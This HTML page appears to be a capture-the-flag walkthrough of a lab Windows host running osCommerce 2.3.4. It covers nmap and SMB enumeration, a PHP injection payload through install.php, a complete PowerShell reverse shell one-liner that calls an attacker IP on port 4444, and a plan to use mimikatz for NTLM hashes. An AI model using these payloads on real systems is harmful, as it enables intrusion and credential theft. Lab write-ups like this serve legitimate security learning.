@@ -1,0 +1,245 @@
+<html><head>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        max-width: 800px;
+        margin: 0 auto;
+        padding: 20px;
+        line-height: 1.6;
+        background-color: #f4f4f4;
+    }
+    h1, h2, h3 {
+        color: #333;
+        border-bottom: 2px solid #ddd;
+        padding-bottom: 10px;
+        margin-bottom: 20px;
+    }
+    p {
+        margin-bottom: 20px;
+    }
+    img {
+        max-width: 100%;
+        height: auto;
+        display: block;
+        margin: 0 auto 20px auto;
+    }
+    code {
+        background-color: #f9f9f9;
+        border: 1px solid #ccc;
+        padding: 5px;
+        border-radius: 5px;
+    }
+    pre {
+        background-color: #333;
+        color: #f8f8f2;
+        padding: 10px;
+        border-radius: 5px;
+        overflow-x: auto;
+    }
+</style>
+</head><body><h2>Reconnaissance:</h2>
+
+<p>First of all, to understand whether machine live or not try to
+<code>ping</code> it.</p>
+
+<p><code>
+ping 10.10.118.119
+</code></p>
+
+<p>The output should look like:</p>
+
+<p><img src="images/06c49cfdb3563b7ef75c44823412a9a9.png" alt="" /></p>
+
+<p>Add your ip address to <code>/etc/hosts</code> file.</p>
+
+<p><code>
+nano /etc/host
+</code></p>
+
+<p>Include your ip address the format provided below:</p>
+
+<p><img src="images/e256c9ecc71b6a629d2932ab628f67d2.png" alt="" /></p>
+
+<p>Before move on, I highly recommend you to check manually whether <code>web application</code> runs on <code>port 80/443</code> via browser. In most scenarios, we will not have https protocol.</p>
+
+<p><code>
+//The route that you need to follow is:
+http://blueprint.thm
+</code></p>
+
+<p>This route automatically interact with HTTP protocol. Most of the time browsers have default routing mechanism directing to port 443. We should always try to route port 80 by just manually adding <code>http://</code></p>
+
+<p><img src="images/c068cd371cefeebe4fea0d6d0d2a2ca3.png" alt="" /></p>
+
+<p>Recently, I also tried to check <code>Apache</code> commonly running on port 8080:</p>
+
+<p><img src="images/dcab54bce716923eec702c7e99121b0c.png" alt="" /></p>
+
+<p>As you can see above, we have an directory named <code>oscommerce-2.3.4</code>. I was curious about it ,so I searched about our Operating System commerce app.</p>
+
+<p><img src="images/8266e4bfeda1bd42d8f9794eb4ea0a13.png" alt="" /></p>
+
+<p>It is clear that we should trigger RCE through web app. However, further reconnaissance is not harmful :) I also wanted to <code>fuzz</code> this route <code>http://blueprint:8080</code></p>
+
+<p>For the fuzzing, I thought that <code>dirsearch</code> and <code>dirb</code> will be suitable:</p>
+
+<p><code>Dirsearch</code> payload:</p>
+
+<p><code>
+dirsearch -u http://blueprint.thm:8080
+</code></p>
+
+<p><img src="images/f19c9085129709ee14d013be869df69b.png" alt="" /></p>
+
+<p>I just got <code>/server-status/</code>, <code>/server-info</code> paths. Capturing server data is useful for the architectural understanding. Let me extract what we have so far !</p>
+
+<p><img src="images/9eb9cd58b9ea5e04c890326b5c1f471f.png" alt="" /></p>
+
+<p>I was dealing with <code>Win32</code> architecture, <code>Apache</code> as a web server and for the backend <code>PHP</code> working on the machine. Furthermore, on <code>/oscommerce-2.3.4/docs/</code> path, there was a database dump. However, I could not reach any juicy information.</p>
+
+<p><img src="images/602e8f042f463dc47ebfdf6a94ed5a6d.png" alt="" /></p>
+
+<p>The <code>database scheme</code> pattern looks like <code>ER diagram</code>.</p>
+
+<p>Nmap was beneficial to get extended data about application:</p>
+
+<p>Nmap Payloads:
+```
+sudo nmap -sV -sC blueprint.thm</p>
+
+<p>sudo nmap -sV -sC -p- blueprint.thm
+```</p>
+
+<p>Since I have already get what we need especially architecture of the application. I preferred to use only <code>default script</code> scan. Moreover, full port scan was not compatible on this scenario because it ran really slow. Anyway, let's check the <code>network mapper</code> output.</p>
+
+<p><img src="images/7afbb1602613ec52b265d7a54ad27330.png" alt="" /></p>
+
+<p>The results depicted that I did not check only the port <code>445</code> as known as <code>SMB</code> (Server Message Block).</p>
+
+<p><img src="images/586e508f161f26ce94633729ac56c602.png" alt="" /></p>
+
+<p><code>Nmap</code> script engine automatically run <code>default smb scripts</code> against on target. Lastly, checking the SMB will be crucial to get initial compromise since <code>nmap</code> script result revealed the potential discovery on <code>SMB</code>.</p>
+
+<p>According to <code>HackTricks</code>, we can use <code>enum4linux</code> to enumerate the target:</p>
+
+<p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb">Pentesting SMB</a></p>
+
+<p><img src="images/59b2900aa03cb2182a51cdb520b535b6.png" alt="" /></p>
+
+<p><code>
+enum4linux -a 10.10.118.119
+</code></p>
+
+<p>The most identical part of the <code>enum4linux</code> output was the <code>nbtstat information</code>.</p>
+
+<p><img src="images/9eb60bc8bf2b004e4db7d1cc0d5f1d8c.png" alt="" /></p>
+
+<p>Script could get the <code>Domain/Workgroup</code> named <code>WORKGROUP</code>. Let me try to authenticate it through without giving credentials.</p>
+
+<p><img src="images/c00b57557743e709b8b96933432e0dfa.png" alt="" /></p>
+
+<p><code>
+    //IPC$ did not allow me to run any commands
+    ──(root㉿kali)-[/home/kali]
+    └─# smbclient -U '%' -N \\\\10.10.118.119\\IPC$  
+    Try "help" to get a list of possible commands.
+    smb: \&gt; dir
+    NT_STATUS_ACCESS_DENIED listing \*
+    smb: \&gt; whoami
+    whoami: command not found
+    smb: \&gt; ls
+    NT_STATUS_ACCESS_DENIED listing \*
+    smb: \&gt; 
+</code></p>
+
+<p>SMB did not give me useful findings. Therefore, I switched on exploitdb to get initial compromise.</p>
+
+<p><a href="https://www.exploit-db.com/exploits/44374">RCE</a></p>
+
+<p><img src="images/7b6fbd4c592d356e087a0f1053751007.png" alt="" /></p>
+
+<p>There was a web app based vulnerability occurs ,so let me apply this manually before I demonstrate all the ways to compromise machine.</p>
+
+<p>Specifically, <code>PHP engine</code> shows an error the path <code>/install.php?step=4</code>. DB configuration error occured.</p>
+
+<p><img src="images/2484a7df36877a14689574eebda6dd7c.png" alt="" /></p>
+
+<p>I intended to do directly manual without any tool ,but it did not work. That's why, lets run `manual exploit</p>
+
+<p>Firstly, edit the 
+<code>url</code> part of the script:</p>
+
+<p><img src="images/93fa92bdae1981a20d355379e140e730.png" alt="" /></p>
+
+<p>As you can see below, it did not work because the script automatically tried to execute <code>system('ls')</code> command on the OS.</p>
+
+<p><img src="images/1e412544122065c25107eadecd8208c7.png" alt="" /></p>
+
+<p>However, the web app disabled such commands by default ,so lets run another payload from <a href="https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution">Github</a></p>
+
+<p>To understand how the script works, I initially ran it just by giving any parameters and inputs.</p>
+
+<p><img src="images/c9baca3cda1c39194c04fe2170c3da65.png" alt="" /></p>
+
+<p>Payload that I have used:</p>
+
+<p><code>
+python3 osCommerce2_3_4RCE.py http://10.10.31.69:8080/oscommerce-2.3.4/catalog
+</code></p>
+
+<p>Custom script directly injects the payload through the POST method on <code>install.php?step=4</code> and manipulating DB_DATABASE parameter to include <code>PHP command injection</code> by <code>passthru()</code> method. As you know, I could not use system(); method because of the web app restrictions.</p>
+
+<p>Malicious payload:</p>
+
+<p><code>
+'); passthru('whoami'); /*
+</code></p>
+
+<p><img src="images/88399fdcf82e54c15ebbaabe86ff3e5e.png" alt="" /></p>
+
+<p>Although there were not any privilege execution mechanism on script, I had straightforwardly get <code>NT AUTHORITY\SYSTEM</code>. However, still I could not move any paths directly on <code>OS</code>.</p>
+
+<p><img src="images/ba6beb7ae28ef0a97d7a0a038feb5060.png" alt="" /></p>
+
+<p>Hence, I also wanted to try again <a href="https://www.exploit-db.com/exploits/44374"><code>Exploit Db</code></a> Maybe I can upgrade my shell with <code>Powershell reverse shell</code>. Because of the script's iteration. I was not able to interact with shell properly. It only allowed me to show <code>current directory</code>.</p>
+
+<p>The payload that I used:
+<code>
+powershell -NoProfile -Command "$client = New-Object System.Net.Sockets.TCPClient(\'10.11.69.113\',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \'PS \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+</code></p>
+
+<p>Just change the IP address with your machine and port. You can generate your payloads from here:</p>
+
+<p><a href="https://www.revshells.com/">RevShell Generator</a></p>
+
+<p>Now deploy <code>netcat listener</code>:</p>
+
+<p><code>
+nc -lvnp 4444
+</code></p>
+
+<p><img src="images/7134f8f5aced525d1c11d229063305e7.png" alt="" /></p>
+
+<p>You can directly paste when you prepare your payload as above. Then switch on the shell that you spawned.</p>
+
+<p>You should wait at least <code>15 seconds</code> to ensure ready your upgraded <code>reverse shell</code>. That's all ! !</p>
+
+<p><img src="images/75c168b671d4ce827fca23907d85f114.png" alt="" /></p>
+
+<p>To get <code>LAB</code> user flag, you should use <code>Mimikatz</code> to get the <code>NTLM</code> hash of the user.</p>
+
+<p>Upload <code>mimikatz.exe</code>:</p>
+
+<p>deploy local python server
+<code>
+python -m http.server 3131
+</code></p>
+
+<p>Since the target is x86 device known as 32bit:</p>
+
+<p><img src="images/7ae5e99a8c2f19cd25f44313293553aa.png" alt="" /></p>
+
+<p>Using <code>mimikatz32.exe</code> is compatible for us. That's all for m today guys ! !</p>
+
+<p>May The Pentest Be With Your ! !</p>
+</body></html>
